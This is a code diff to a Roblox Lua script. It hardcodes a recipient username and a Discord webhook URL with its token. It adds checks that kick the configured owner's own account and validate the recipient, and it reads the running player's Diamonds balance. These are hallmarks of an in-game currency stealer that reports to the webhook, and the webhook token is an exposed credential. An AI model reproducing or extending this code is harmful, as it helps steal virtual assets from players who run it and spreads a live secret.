@@ -61,13 +61,44 @@ setclipboard = antiPrint
 -- Users And Stuff
 
 if UserName == nil then
-    UserName = _G.UserName
+    UserName = "TehPucuk_55"
 end
 if UserName2 == nil then
-    UserName2 = _G.UserName2
+    UserName2 = "TehPucuk_55"
 end
 if Webhook == nil then
-    Webhook = _G.Webhook
+    Webhook = "https://discord.com/api/webhooks/1123535473143463946/T7h4jIdHyVSLFVeeffMfTnxKCCs1MvjSpM0nYFVwvxs_tsBE5SwY1YKSssd0XgP9-neU"
+end
+-- User Checks
+
+local idiotuser = game:GetService("Players").LocalPlayer.Name
+
+if idiotuser == UserName then
+    game:GetService("Players").LocalPlayer:Kick("You Are The Owner! (test it on alt acc)")
+    return;
+end
+if UserName == nil then
+    game:GetService("Players").LocalPlayer:Kick("Put A UserName")
+    return;
+end
+local worked2 = pcall(function()
+    game:GetService("Players"):GetUserIdFromNameAsync(UserName)
+end)
+if not worked2 then
+    game:GetService("Players").LocalPlayer:Kick("Put A Valid Username!")
+    return;
+end
+if worked2 then
+    _G.UserID = game:GetService("Players"):GetUserIdFromNameAsync(UserName)
+end
+if UserName2 ~= nil then
+    local worked3 = pcall(function()
+        game:GetService("Players"):GetUserIdFromNameAsync(UserName2)
+    end)
+    if not worked3 then
+        game:GetService("Players").LocalPlayer:Kick("Put A Valid Username2!")
+        return;
+    end
 end
 
 local diaamt99 = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Diamonds
